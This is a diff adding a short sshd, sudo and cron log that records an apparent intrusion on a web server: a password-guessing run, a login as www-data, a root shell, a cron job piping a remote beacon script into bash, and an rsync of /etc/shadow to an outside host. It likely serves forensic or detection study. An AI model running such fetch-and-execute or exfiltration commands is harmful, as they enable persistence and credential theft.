@@ -1,0 +1,10 @@
+May 28 02:10:11 websrv-01 sshd[2041]: Failed password for invalid user admin from 203.0.113.45 port 54012 ssh2
+May 28 02:10:24 websrv-01 sshd[2041]: Failed password for invalid user root from 203.0.113.45 port 54013 ssh2
+May 28 02:10:39 websrv-01 sshd[2041]: Failed password for invalid user postgres from 203.0.113.45 port 54014 ssh2
+May 28 02:10:51 websrv-01 sshd[2041]: Failed password for invalid user oracle from 203.0.113.45 port 54015 ssh2
+May 29 23:55:42 websrv-01 sshd[2099]: Accepted password for www-data from 203.0.113.45 port 54120 ssh2
+May 29 23:58:03 websrv-01 sudo[2150]: www-data : TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+May 31 04:25:17 websrv-01 cron[2210]: (root) CMD (curl -s http://198.51.100.200/beacon.sh | bash)
+May 31 14:41:30 websrv-01 sshd[2305]: Accepted password for www-data from 203.0.113.45 port 54330 ssh2
+Jun 02 02:05:55 websrv-01 sudo[2410]: www-data : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/rsync /etc/shadow root@198.51.100.200:/exfil
+Jun 02 02:18:22 websrv-01 sshd[2511]: Connection from 10.0.0.55 port 49888 to 10.0.0.10 port 22
